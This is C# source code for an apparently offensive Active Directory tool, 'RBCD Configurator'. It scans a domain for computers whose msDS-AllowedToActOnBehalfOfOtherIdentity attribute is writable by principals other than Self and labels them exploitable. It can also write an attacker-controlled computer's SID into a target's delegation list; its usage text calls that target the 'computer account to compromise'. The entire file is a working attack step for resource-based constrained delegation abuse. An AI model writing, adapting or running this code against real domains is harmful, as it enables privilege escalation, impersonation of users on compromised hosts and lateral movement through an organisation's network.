using System;
using System.Collections.Generic;
using System.Diagnostics.Eventing.Reader;
using System.DirectoryServices.Protocols;
using System.Security.AccessControl;
using System.Security.Principal;

namespace RBCD_Configurator
{
    class Program
    {
        // GUID del atributo msDS-AllowedToActOnBehalfOfOtherIdentity
        private static readonly Guid RBCD_ATTRIBUTE_GUID = new Guid("3f78c3e5-f79a-46bd-a0b8-9d18116ddc79");

        // SID del principal "Self" que queremos filtrar
        private static readonly string SELF_SID = "S-1-5-10";

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                ShowUsage();
                return;
            }

            // Modo verificación
            if (args[0].ToLower() == "-verify" || args[0].ToLower() == "--verify")
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("[!] Error: Domain required for verification mode");
                    Console.WriteLine("Usage: rbcd_manager.exe -verify <domain>");
                    Console.WriteLine("Example: rbcd_manager.exe -verify CONTOSO.LOCAL");
                    return;
                }

                string domainName = args[1];
                try
                {
                    VerifyRBCDPermissions(domainName);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error: " + ex.Message);
                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
                }
                return;
            }

            // Modo configuración RBCD
            if (args.Length < 3)
            {
                ShowUsage();
                return;
            }

            string targetComputer = args[0];
            string attackerComputer = args[1];
            string domain = args[2];

            try
            {
                ConfigureRBCD(targetComputer, attackerComputer, domain);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error: " + ex.Message);
                Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
            }
        }

        static void ShowUsage()
        {
            Console.WriteLine(@"
RBCD Configurator - Resource-Based Constrained Delegation Tool

Usage:
  [1] Configuration Mode:
      rbcd_manager.exe <target_computer> <attacker_computer> <domain>
      
      Arguments:
        target_computer   - Computer account to compromise (will have RBCD configured)
        attacker_computer - Computer account that will be allowed to delegate to target
        domain            - Domain name (e.g., CONTOSO.LOCAL)
      
      Example: rbcd_manager.exe WEB01 ATTACKER01 CONTOSO.LOCAL

  [2] Verification Mode:
      rbcd_manager.exe -verify <domain>
      
      This mode enumerates computers where principals OTHER THAN 'Self' have WriteProperty
      permissions on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
      
      Example: rbcd_manager.exe -verify CONTOSO.LOCAL

Note: Computer names can be with or without $ suffix.
      Will use current security context for authentication.
      Verification mode filters out computers where only 'Self' has permissions.
");
        }

        static void VerifyRBCDPermissions(string domainName)
        {
            Console.WriteLine("[*] Starting RBCD permissions verification");
            Console.WriteLine("[*] Domain: " + domainName);
            Console.WriteLine("[*] Current user: " + WindowsIdentity.GetCurrent().Name);
            Console.WriteLine();

            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domainName));
            ldapConnection.SessionOptions.ProtocolVersion = 3;
            ldapConnection.AuthType = AuthType.Negotiate;

            try
            {
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated to " + domainName);
            }
            catch (LdapException ex)
            {
                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
                ldapConnection.AuthType = AuthType.Kerberos;
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated with Kerberos");
            }

            string currentUserSid = WindowsIdentity.GetCurrent().User.Value;
            Console.WriteLine("[*] Current user SID: " + currentUserSid);
            Console.WriteLine();

            Console.WriteLine("[*] Enumerating computers in domain...");
            List<string> computers = GetAllComputers(ldapConnection, domainName);
            Console.WriteLine("[+] Found " + computers.Count + " computers");
            Console.WriteLine();

            Console.WriteLine("[*] Checking RBCD WriteProperty permissions...");
            Console.WriteLine("[*] Filtering out computers where only 'Self' has permissions...");
            Console.WriteLine("================================================================================");

            int vulnerableCount = 0;
            int totalWithPermissions = 0;

            foreach (string computerDN in computers)
            {
                List<string> permittedSids = CheckRBCDPermissions(ldapConnection, computerDN);

                if (permittedSids.Count > 0)
                {
                    totalWithPermissions++;

                    // FILTRO CRÍTICO: Remover el SID de "Self" de la lista
                    List<string> filteredSids = new List<string>();
                    foreach (string sid in permittedSids)
                    {
                        if (sid != SELF_SID)
                        {
                            filteredSids.Add(sid);
                        }
                    }

                    // Solo mostrar si hay SIDs además de Self
                    if (filteredSids.Count > 0)
                    {
                        vulnerableCount++;
                        Console.WriteLine();
                        Console.WriteLine("Computer: " + computerDN);
                        Console.WriteLine("Principals with WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity:");

                        foreach (string sid in filteredSids)
                        {
                            string accountName = ResolveSidToName(ldapConnection, sid, domainName);
                            Console.WriteLine("  - SID: " + sid);
                            Console.WriteLine("    Name: " + accountName);
                        }
                    }
                }
            }

            Console.WriteLine();
            Console.WriteLine("================================================================================");
            Console.WriteLine("[+] Verification complete!");
            Console.WriteLine("[+] Total computers analyzed: " + computers.Count);
            Console.WriteLine("[+] Computers with any RBCD permissions: " + totalWithPermissions);
            Console.WriteLine("[+] Computers with exploitable RBCD permissions (excluding Self): " + vulnerableCount);

            if (vulnerableCount == 0)
            {
                Console.WriteLine();
                Console.WriteLine("[*] No exploitable RBCD misconfigurations found.");
                Console.WriteLine("[*] All computers only have 'Self' permissions (default/secure configuration).");
            }

            ldapConnection.Dispose();
        }

        static List<string> GetAllComputers(LdapConnection connection, string domain)
        {
            List<string> computers = new List<string>();
            string searchBase = "DC=" + domain.Replace(".", ",DC=");
            string filter = "(objectClass=computer)";

            SearchRequest searchRequest = new SearchRequest(
                searchBase,
                filter,
                SearchScope.Subtree,
                new string[] { "distinguishedName" }
            );

            PageResultRequestControl pageControl = new PageResultRequestControl(1000);
            searchRequest.Controls.Add(pageControl);

            while (true)
            {
                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                foreach (SearchResultEntry entry in searchResponse.Entries)
                {
                    computers.Add(entry.DistinguishedName);
                }

                PageResultResponseControl pageResponse = (PageResultResponseControl)searchResponse.Controls[0];

                if (pageResponse.Cookie.Length == 0)
                    break;

                pageControl.Cookie = pageResponse.Cookie;
            }

            return computers;
        }

        static List<string> CheckRBCDPermissions(LdapConnection connection, string distinguishedName)
        {
            List<string> permittedSids = new List<string>();

            try
            {
                SearchRequest searchRequest = new SearchRequest(
                    distinguishedName,
                    "(objectClass=*)",
                    SearchScope.Base,
                    new string[] { "nTSecurityDescriptor" }
                );

                SecurityDescriptorFlagControl sdControl = new SecurityDescriptorFlagControl();
                sdControl.SecurityMasks = SecurityMasks.Dacl;
                searchRequest.Controls.Add(sdControl);

                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                if (searchResponse.Entries.Count == 0)
                    return permittedSids;

                byte[] ntSecurityDescriptor = searchResponse.Entries[0].Attributes["nTSecurityDescriptor"][0] as byte[];
                RawSecurityDescriptor sd = new RawSecurityDescriptor(ntSecurityDescriptor, 0);

                foreach (GenericAce genericAce in sd.DiscretionaryAcl)
                {
                    ObjectAce objectAce = genericAce as ObjectAce;
                    if (objectAce == null)
                        continue;

                    if (objectAce.AceQualifier != AceQualifier.AccessAllowed)
                        continue;

                    if ((objectAce.AccessMask & 0x20) == 0)
                        continue;

                    if (objectAce.ObjectAceType == RBCD_ATTRIBUTE_GUID)
                    {
                        string sidValue = objectAce.SecurityIdentifier.Value;
                        if (!permittedSids.Contains(sidValue))
                        {
                            permittedSids.Add(sidValue);
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Ignorar errores en computadoras individuales
            }

            return permittedSids;
        }

        static string ResolveSidToName(LdapConnection connection, string sid, string domain)
        {
            try
            {
                string searchBase = "DC=" + domain.Replace(".", ",DC=");
                string filter = "(objectSid=" + ConvertSidToSearchFilter(sid) + ")";

                SearchRequest searchRequest = new SearchRequest(
                    searchBase,
                    filter,
                    SearchScope.Subtree,
                    new string[] { "sAMAccountName", "distinguishedName" }
                );

                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                if (searchResponse.Entries.Count > 0)
                {
                    if (searchResponse.Entries[0].Attributes.Contains("sAMAccountName"))
                    {
                        return searchResponse.Entries[0].Attributes["sAMAccountName"][0].ToString();
                    }
                    return searchResponse.Entries[0].DistinguishedName;
                }
            }
            catch (Exception)
            {
                // Si no se puede resolver, retornar el SID
            }

            return "Unknown (" + sid + ")";
        }

        static string ConvertSidToSearchFilter(string sid)
        {
            SecurityIdentifier secId = new SecurityIdentifier(sid);
            byte[] sidBytes = new byte[secId.BinaryLength];
            secId.GetBinaryForm(sidBytes, 0);

            string result = "";
            foreach (byte b in sidBytes)
            {
                result += "\\" + b.ToString("x2");
            }
            return result;
        }

        static void ConfigureRBCD(string targetComputer, string attackerComputer, string domain)
        {
            if (!targetComputer.EndsWith("$"))
                targetComputer += "$";
            if (!attackerComputer.EndsWith("$"))
                attackerComputer += "$";

            Console.WriteLine("[*] Configuring RBCD for " + targetComputer);
            Console.WriteLine("[*] Using: " + WindowsIdentity.GetCurrent().Name);

            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domain));
            ldapConnection.SessionOptions.ProtocolVersion = 3;
            ldapConnection.AuthType = AuthType.Negotiate;

            try
            {
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated to " + domain);
            }
            catch (LdapException ex)
            {
                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
                ldapConnection.AuthType = AuthType.Kerberos;
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated with Kerberos");
            }

            Console.WriteLine("[*] Searching for " + targetComputer);
            string targetDN = FindComputerDN(ldapConnection, targetComputer, domain);
            Console.WriteLine("[+] Found target: " + targetDN);

            Console.WriteLine("[*] Searching for " + attackerComputer);
            string attackerDN = FindComputerDN(ldapConnection, attackerComputer, domain);
            Console.WriteLine("[+] Found attacker: " + attackerDN);

            if (!HasSPN(ldapConnection, attackerDN))
            {
                Console.WriteLine("[!] WARNING: Attacker has no SPN!");
            }
            else
            {
                Console.WriteLine("[+] Attacker has SPN registered");
            }

            string attackerSid = GetObjectSid(ldapConnection, attackerDN);
            Console.WriteLine("[+] Attacker SID: " + attackerSid);

            string targetSid = GetObjectSid(ldapConnection, targetDN);
            Console.WriteLine("[+] Target SID: " + targetSid);

            byte[] existingSD = GetExistingSecurityDescriptor(ldapConnection, targetDN);
            string newSD = AddSidToSecurityDescriptor(existingSD, attackerSid, targetSid);
            ModifyAttribute(ldapConnection, targetDN, "msDS-AllowedToActOnBehalfOfOtherIdentity", newSD);

            Console.WriteLine("[+] RBCD configured successfully!");
            Console.WriteLine("[+] " + attackerComputer + " added to delegation list for " + targetComputer);
            ldapConnection.Dispose();
        }

        static string FindComputerDN(LdapConnection connection, string computerName, string domain)
        {
            string searchBase = "DC=" + domain.Replace(".", ",DC=");
            string filter = "(&(objectClass=computer)(sAMAccountName=" + computerName + "))";

            SearchRequest searchRequest = new SearchRequest(searchBase, filter, SearchScope.Subtree, new string[] { "distinguishedName" });
            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                throw new Exception("Computer " + computerName + " not found");
            }

            return searchResponse.Entries[0].Attributes["distinguishedName"][0].ToString();
        }

        static bool HasSPN(LdapConnection connection, string distinguishedName)
        {
            SearchRequest searchRequest = new SearchRequest(distinguishedName, "(objectClass=*)", SearchScope.Base, new string[] { "servicePrincipalName" });
            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                return false;
            }

            return searchResponse.Entries[0].Attributes.Contains("servicePrincipalName");
        }

        static string GetObjectSid(LdapConnection connection, string distinguishedName)
        {
            SearchRequest searchRequest = new SearchRequest(distinguishedName, "(objectClass=*)", SearchScope.Base, new string[] { "objectSid" });
            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                throw new Exception("Object not found: " + distinguishedName);
            }

            byte[] sidBytes = searchResponse.Entries[0].Attributes["objectSid"][0] as byte[];
            SecurityIdentifier sid = new SecurityIdentifier(sidBytes, 0);
            return sid.Value;
        }

        static byte[] GetExistingSecurityDescriptor(LdapConnection connection, string distinguishedName)
        {
            SearchRequest searchRequest = new SearchRequest(
                distinguishedName,
                "(objectClass=*)",
                SearchScope.Base,
                new string[] { "msDS-AllowedToActOnBehalfOfOtherIdentity" }
            );

            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                Console.WriteLine("[*] Target object found but no existing RBCD configured");
                return null;
            }

            if (!searchResponse.Entries[0].Attributes.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity"))
            {
                Console.WriteLine("[*] No existing RBCD configuration found (attribute empty)");
                return null;
            }

            byte[] existingSD = searchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"][0] as byte[];
            Console.WriteLine("[+] Found existing RBCD configuration, will append to it");
            return existingSD;
        }

        static string AddSidToSecurityDescriptor(byte[] existingSDBytes, string newSidString, string targetSidString)
        {
            SecurityIdentifier newSid = new SecurityIdentifier(newSidString);
            SecurityIdentifier targetSid = new SecurityIdentifier(targetSidString);
            RawSecurityDescriptor sd;

            if (existingSDBytes != null && existingSDBytes.Length > 0)
            {
                sd = new RawSecurityDescriptor(existingSDBytes, 0);
                Console.WriteLine("[*] Existing RBCD entries found: " + sd.DiscretionaryAcl.Count);

                foreach (CommonAce ace in sd.DiscretionaryAcl)
                {
                    if (ace.SecurityIdentifier.Value == newSidString)
                    {
                        Console.WriteLine("[!] WARNING: SID " + newSidString + " already exists in RBCD list!");
                        Console.WriteLine("[*] Skipping addition (already configured)");

                        byte[] unchangedBytes = new byte[sd.BinaryLength];
                        sd.GetBinaryForm(unchangedBytes, 0);
                        return Convert.ToBase64String(unchangedBytes);
                    }
                }

                sd.DiscretionaryAcl.InsertAce(
                    sd.DiscretionaryAcl.Count,
                    new CommonAce(
                        AceFlags.None,
                        AceQualifier.AccessAllowed,
                        0x000F01FF,
                        newSid,
                        false,
                        null
                    )
                );

                Console.WriteLine("[+] Added new SID to existing RBCD list (total entries: " + sd.DiscretionaryAcl.Count + ")");
            }
            else
            {
                Console.WriteLine("[*] Creating new RBCD configuration");
                RawAcl dacl = new RawAcl(GenericAcl.AclRevision, 1);
                dacl.InsertAce(0, new CommonAce(
                    AceFlags.None,
                    AceQualifier.AccessAllowed,
                    0x000F01FF,
                    newSid,
                    false,
                    null
                ));

                sd = new RawSecurityDescriptor(
                    ControlFlags.DiscretionaryAclPresent,
                    targetSid,
                    targetSid,
                    null,
                    dacl
                );
            }

            byte[] sdBytes = new byte[sd.BinaryLength];
            sd.GetBinaryForm(sdBytes, 0);
            return Convert.ToBase64String(sdBytes);
        }

        static void ModifyAttribute(LdapConnection connection, string distinguishedName, string attributeName, string attributeValue)
        {
            DirectoryAttributeModification mod = new DirectoryAttributeModification();
            mod.Name = attributeName;
            mod.Operation = DirectoryAttributeOperation.Replace;

            if (!string.IsNullOrEmpty(attributeValue))
            {
                mod.Add(Convert.FromBase64String(attributeValue));
            }

            ModifyRequest modifyRequest = new ModifyRequest(distinguishedName, mod);

            try
            {
                ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
                Console.WriteLine("[+] Successfully modified " + attributeName);
            }
            catch (DirectoryOperationException ex)
            {
                if (ex.Response.ResultCode == ResultCode.NoSuchObject)
                {
                    throw new Exception("Target object not found: " + distinguishedName);
                }
                else if (ex.Response.ResultCode == ResultCode.InsufficientAccessRights)
                {
                    throw new Exception("Insufficient permissions");
                }
                else
                {
                    throw new Exception("LDAP error: " + ex.Response.ResultCode);
                }
            }
        }
    }
}
